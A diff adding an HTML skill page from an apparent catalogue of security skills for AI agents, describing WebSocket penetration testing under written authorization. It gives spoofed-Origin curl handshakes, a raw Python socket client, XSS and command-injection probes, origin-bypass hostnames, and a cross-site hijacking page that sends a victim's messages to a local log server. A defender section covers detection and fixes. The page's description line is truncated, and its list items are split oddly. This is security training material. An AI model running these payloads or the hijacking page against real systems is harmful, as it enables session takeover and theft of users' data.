@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: websocket-security</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>websocket-security</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when an application uses WebSockets (ws:// or wss://) on an</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-xss.html">web-xss</a> <a href="auth-attacks.html">auth-attacks</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>WebSockets give the browser a full-duplex channel to the server after a single HTTP Upgrade handshake, and that channel often carries the same privileges as a logged-in session while receiving far less security review than normal HTTP endpoints. This skill covers the full authorized methodology: discovering WebSocket endpoints, testing Origin validation during the handshake, probing how authentication and CSRF protection apply (or fail to apply) to socket traffic, fuzzing message frames for injection flaws, and proving cross-site WebSocket hijacking. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find every WebSocket endpoint: search JavaScript for <code>new WebSocket</code>,</li>
+<p>check Burp Suite proxy history for <code>Upgrade: websocket</code> requests, and watch the browser devtools Network tab filtered by WS.</p>
+<li>Replay the handshake with curl and vary the <code>Origin</code> header to test</li>
+<p>origin validation before touching any message logic.</p>
+<li>Test how the handshake authenticates: cookies, tokens in the URL, custom</li>
+<p>headers, or nothing at all.</p>
+<li>Connect with a Python script and exercise each message type the client</li>
+<p>sends: chat text, commands, JSON actions.</p>
+<li>Fuzz message fields for injection: XSS payloads, JSON structure breaks,</li>
+<p>oversized frames, and binary frames.</p>
+<li>Test cross-site WebSocket hijacking with a local HTML proof of concept</li>
+<p>page when origin validation is missing.</p>
+<li>Check for authorization flaws: can one user&#x27;s socket read or act on</li>
+<p>another user&#x27;s data, rooms, or channels.</p>
+<li>Record every handshake request and response, every message pair, and the</li>
+<p>exact origin policy observed, for the report.</p>
+</ol>
+<h2>1. Discovering WebSocket endpoints</h2>
+<p>WebSocket URLs hide in client JavaScript, in mobile app traffic, and in proxy history. Collect them all before testing.</p>
+<pre><code class="language-bash"># Search fetched JavaScript for WebSocket constructors (run from a saved copy)
+grep -rhoE &quot;new WebSocket\([&#x27;\&quot;][^&#x27;\&quot;]+[&#x27;\&quot;]&quot; /tmp/js/ | sort -u
+
+# Common patterns also include wss:// assigned to variables
+grep -rhoE &quot;wss?://[a-zA-Z0-9./:_?=-]+&quot; /tmp/js/*.js | sort -u | head -30</code></pre>
+<pre><code class="language-bash"># In Burp Suite 2026.2, filter proxy history for the Upgrade header,
+# or reproduce the handshake filter from the command line against a log:
+grep -i &quot;upgrade: websocket&quot; /tmp/burp-history-export.txt | head -10</code></pre>
+<p>Open the application in a browser with devtools, filter the Network tab by WS, and click through every real-time feature (chat, notifications, live search). Each socket that opens is an endpoint to test. Note the full URL, the subprotocol if any (<code>Sec-WebSocket-Protocol</code>), and whether the URL carries a token.</p>
+<h2>2. Testing Origin validation on the handshake</h2>
+<p>The <code>Origin</code> header is the main CSRF-style defense for WebSockets, because browsers send it on the handshake but same-origin policy does not block the handshake itself. Replay the handshake with different origins and watch for HTTP 101 (accepted) versus 403 (rejected).</p>
+<pre><code class="language-bash"># Baseline: legitimate origin, expect HTTP 101 Switching Protocols
+curl -si -N \
+  -H &quot;Connection: Upgrade&quot; \
+  -H &quot;Upgrade: websocket&quot; \
+  -H &quot;Sec-WebSocket-Version: 13&quot; \
+  -H &quot;Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==&quot; \
+  -H &quot;Origin: https://target.example&quot; \
+  https://target.example/socket | head -12</code></pre>
+<pre><code class="language-bash"># Evil origin: a 101 here means missing or broken origin validation
+curl -si -N \
+  -H &quot;Connection: Upgrade&quot; \
+  -H &quot;Upgrade: websocket&quot; \
+  -H &quot;Sec-WebSocket-Version: 13&quot; \
+  -H &quot;Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==&quot; \
+  -H &quot;Origin: https://evil.example&quot; \
+  https://target.example/socket | head -12
+
+# Null origin (sandboxed iframes, redirects, and data: URLs send this)
+curl -si -N \
+  -H &quot;Connection: Upgrade&quot; \
+  -H &quot;Upgrade: websocket&quot; \
+  -H &quot;Sec-WebSocket-Version: 13&quot; \
+  -H &quot;Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==&quot; \
+  -H &quot;Origin: null&quot; \
+  https://target.example/socket | head -12
+
+# No Origin header at all (non-browser clients omit it)
+curl -si -N \
+  -H &quot;Connection: Upgrade&quot; \
+  -H &quot;Upgrade: websocket&quot; \
+  -H &quot;Sec-WebSocket-Version: 13&quot; \
+  -H &quot;Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==&quot; \
+  https://target.example/socket | head -12</code></pre>
+<p>Also try origin bypass variants when a check seems present: trailing dot (<code>https://target.example.</code>), subdomain tricks (<code>https://target.example.evil.example</code>), and scheme confusion (<code>http://target.example</code>). A check that compares with <code>startsWith</code> or a loose regex falls to these.</p>
+<h2>3. Authentication and session handling</h2>
+<p>Determine what the server trusts during the handshake. Send the handshake with and without cookies, and look for tokens embedded in the WebSocket URL.</p>
+<pre><code class="language-bash"># Handshake WITHOUT cookies: does the server still upgrade?
+curl -si -N \
+  -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: websocket&quot; \
+  -H &quot;Sec-WebSocket-Version: 13&quot; \
+  -H &quot;Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==&quot; \
+  -H &quot;Origin: https://target.example&quot; \
+  https://target.example/socket | head -8
+
+# Handshake with a session cookie copied from the browser
+curl -si -N -b &quot;session=STOLEN_TEST_SESSION&quot; \
+  -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: websocket&quot; \
+  -H &quot;Sec-WebSocket-Version: 13&quot; \
+  -H &quot;Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==&quot; \
+  -H &quot;Origin: https://target.example&quot; \
+  https://target.example/socket | head -8</code></pre>
+<p>Key questions to answer: does the URL contain a token like <code>wss://target.example/socket?token=abc</code> (leaks in logs and browser history), does the server accept the handshake with no session at all, and does it re-check authorization per message or only once at connect time. A socket that upgrades anonymously but later accepts privileged commands is a full authentication bypass.</p>
+<h2>4. Connecting and exercising messages with Python</h2>
+<p>Use a stdlib-only client so the test runs anywhere. This script performs the handshake, sends masked text frames (required for client to server), and prints server frames.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Minimal stdlib WebSocket client for authorized testing.&quot;&quot;&quot;
+import socket, ssl, base64, hashlib, os, struct
+
+HOST = &quot;target.example&quot;
+PORT = 443
+PATH = &quot;/socket&quot;
+ORIGIN = &quot;https://target.example&quot;
+COOKIE = &quot;session=YOUR_TEST_SESSION&quot;
+
+key = base64.b64encode(os.urandom(16)).decode()
+req = (
+    f&quot;GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\n&quot;
+    &quot;Upgrade: websocket\r\nConnection: Upgrade\r\n&quot;
+    f&quot;Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n&quot;
+    f&quot;Origin: {ORIGIN}\r\nCookie: {COOKIE}\r\n\r\n&quot;
+)
+s = socket.create_connection((HOST, PORT), timeout=10)
+s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
+s.sendall(req.encode())
+resp = s.recv(4096).decode(errors=&quot;replace&quot;)
+print(resp.split(&quot;\r\n\r\n&quot;)[0])
+assert &quot;101&quot; in resp.splitlines()[0], &quot;handshake rejected&quot;
+
+def send_text(msg):
+    data = msg.encode()
+    mask = os.urandom(4)
+    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
+    hdr = bytes([0x81, 0x80 | len(data)]) + mask  # FIN+text, masked
+    s.sendall(hdr + masked)
+
+def recv_text():
+    h = s.recv(2)
+    ln = h[1] &amp; 0x7F
+    if ln == 126:
+        ln = struct.unpack(&quot;&gt;H&quot;, s.recv(2))[0]
+    return s.recv(ln).decode(errors=&quot;replace&quot;)
+
+# Exercise the message types the real client sends
+send_text(&#x27;{&quot;type&quot;:&quot;join&quot;,&quot;room&quot;:&quot;lobby&quot;}&#x27;)
+print(&quot;server:&quot;, recv_text())
+send_text(&#x27;{&quot;type&quot;:&quot;msg&quot;,&quot;room&quot;:&quot;lobby&quot;,&quot;text&quot;:&quot;hello from test&quot;}&#x27;)
+print(&quot;server:&quot;, recv_text())</code></pre>
+<p>Capture the real client&#x27;s messages first (Burp WebSocket history or devtools WS frames), then replay and mutate them with this script. Change field values, add unexpected fields, and send commands the UI never sends, such as <code>{&quot;type&quot;:&quot;admin&quot;}</code> or <code>{&quot;type&quot;:&quot;msg&quot;,&quot;room&quot;:&quot;admin-only&quot;}</code>.</p>
+<h2>5. Message-level injection</h2>
+<p>Every string the server echoes back to any client is a stored XSS candidate, and every string the server parses is an injection candidate.</p>
+<pre><code class="language-bash"># XSS probe through the chat message (watch other connected clients,
+# including a second browser session, for execution)
+# Send via the Python client:
+# {&quot;type&quot;:&quot;msg&quot;,&quot;room&quot;:&quot;lobby&quot;,&quot;text&quot;:&quot;&lt;img src=x onerror=alert(1)&gt;&quot;}</code></pre>
+<p>Test these systematically:</p>
+<ul>
+<li>HTML and JavaScript in chat text, usernames, status messages, and</li>
+<p>filenames: <code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;img src=x onerror=alert(1)&gt;</code>.</p>
+<li>JSON structure breaks: send a string where a number is expected,</li>
+<p>deeply nested objects, and duplicate keys.</p>
+<li>Command injection style probes where the server might shell out:</li>
+<p><code>$(id)</code>, backticks, and <code>;</code> in fields like filenames or search terms.</p>
+<li>Oversized frames: a 10 MB text message tests for memory exhaustion</li>
+<p>handling (keep this gentle and inside the agreed test window).</p>
+<li>Binary frames: send opcode 0x2 with random bytes and watch for crashes</li>
+<p>or verbose errors that leak stack traces.</p>
+</ul>
+<p>If the server broadcasts your input to other users, you have stored XSS delivered over WebSockets, which most scanners miss entirely.</p>
+<h2>6. Cross-site WebSocket hijacking (CSWSH)</h2>
+<p>When origin validation is missing and the handshake relies on cookies, any website the victim visits can open an authenticated socket as the victim. Build the proof of concept locally, never hosted on a third-party domain during the test.</p>
+<pre><code class="language-html">&lt;!-- cswsh-poc.html: serve from http://127.0.0.1:8000 during the test --&gt;
+&lt;script&gt;
+  // Victim must be logged in to target.example in this browser
+  var ws = new WebSocket(&quot;wss://target.example/socket&quot;);
+  ws.onopen = function () {
+    ws.send(JSON.stringify({type: &quot;msg&quot;, room: &quot;lobby&quot;,
+      text: &quot;CSWSH proof: socket opened cross-origin&quot;}));
+  };
+  ws.onmessage = function (e) {
+    // Exfiltrate received messages to the test console
+    console.log(&quot;LEAKED:&quot;, e.data);
+    fetch(&quot;http://127.0.0.1:8000/log?d=&quot; + encodeURIComponent(e.data));
+  };
+&lt;/script&gt;</code></pre>
+<pre><code class="language-bash"># Serve the PoC locally and open it in a browser logged in to the target
+cd /tmp &amp;&amp; python3 -m http.server 8000</code></pre>
+<p>If messages arrive in the attacker&#x27;s console, the hijack works: the attacker&#x27;s page performs authenticated actions and reads private data as the victim. Pair this with the origin tests from section 2 as evidence.</p>
+<h2>7. Authorization between users and channels</h2>
+<p>Open two sockets as two different test users and try to cross boundaries.</p>
+<ul>
+<li>Join a room or channel the second user was never invited to.</li>
+<li>Send a message with another user&#x27;s <code>user_id</code> or <code>sender</code> field and see</li>
+<p>if the server trusts the client-supplied identity.</p>
+<li>Subscribe to another user&#x27;s private notification channel, often named</li>
+<p>like <code>/user/123/notifications</code>, by guessing the ID.</p>
+<li>Replay a captured privileged message (for example a trade order or an</li>
+<p>admin broadcast) from the low-privilege socket.</p>
+</ul>
+<p>Servers frequently check authorization at HTTP login but never again on the socket. Document the exact message that crossed the boundary.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The endpoint only speaks <code>ws://</code> on an <code>https://</code> page: mixed content</li>
+<p>blocks the browser client, but curl and Python still connect, so test it anyway.</p>
+<li>Binary subprotocols (protobuf, msgpack): decode with the client&#x27;s own</li>
+<p>schema before fuzzing; random bytes just get dropped.</p>
+<li><code>Sec-WebSocket-Protocol</code> negotiation: the server may reject the</li>
+<p>handshake without the exact subprotocol the client sends, so copy it from devtools.</p>
+<li>Heartbeat ping/pong frames: the server may close idle sockets after 30</li>
+<p>to 60 seconds, so keep-alive in long fuzzing loops.</p>
+<li>Rate limiting or WAF on the HTTP handshake does not always apply to</li>
+<p>frames after upgrade; test message flooding separately and gently.</p>
+<li>Multiple tabs share one session cookie: CSWSH impact grows when the</li>
+<p>victim keeps the app open, which is the normal case for chat apps.</p>
+<li>Some servers validate Origin only when the header is present; the</li>
+<p>no-Origin curl test in section 2 catches that logic flaw.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Origin check uses a regex like <code>*.target.example</code>: try</li>
+<p><code>https://target.example.evil.example</code> and <code>https://eviltarget.example</code>.</p>
+<li>The check compares suffixes: <code>https://faketarget.example</code> may pass a</li>
+<p>naive <code>endswith(&quot;target.example&quot;)</code> test.</p>
+<li>Token in the WebSocket URL: steal it from browser history or logs in a</li>
+<p>lab setting, or show that any XSS on the site can read it from JS memory and open a socket.</p>
+<li>The server echoes the <code>Sec-WebSocket-Protocol</code> header: probe it for</li>
+<p>reflected XSS in error pages, a rare but real finding.</p>
+<li>No message authentication: tamper with sequence numbers or message IDs</li>
+<p>to test for replay acceptance, then escalate to the authorization tests in section 7.</p>
+<li>When the handshake needs a CSRF token, check whether the token is</li>
+<p>validated or only checked for presence; empty or static tokens are common.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see WebSocket attacks as HTTP Upgrade requests with unusual or missing <code>Origin</code> headers, a burst of 101 responses from one IP, message rates far above human chat speed, and payload strings (<code>&lt;svg</code>, <code>onerror</code>, <code>${</code>) inside frame bodies logged by the application. The durable fixes are strict Origin allowlisting on the handshake, authenticating the handshake with the same session and CSRF rules as HTTP, never putting tokens in the WebSocket URL, validating and authorizing every message independently, and encoding all user content before broadcast. A WAF rarely inspects frames after upgrade, so server-side validation is the only reliable layer.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the entry point</li>
+<p>class for socket handshake flaws.</p>
+<li>CWE-1385 (Missing Origin Validation in WebSockets).</li>
+<li>CWE-20 (Improper Input Validation): message parsing flaws.</li>
+<li>CWE-79 (Cross-site Scripting): stored XSS delivered through messages.</li>
+<li>CWE-639 (Authorization Bypass Through User-Controlled Key): channel and</li>
+<p>identity confusion.</p>
+<li>OWASP WebSocket Security Cheat Sheet: origin validation, authentication,</li>
+<p>and message validation guidance.</p>
+<li>RFC 6455 (The WebSocket Protocol): handshake and framing rules.</li>
+<li>PortSwigger Web Security Academy: WebSocket labs, including CSWSH and</li>
+<p>message-based XSS.</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
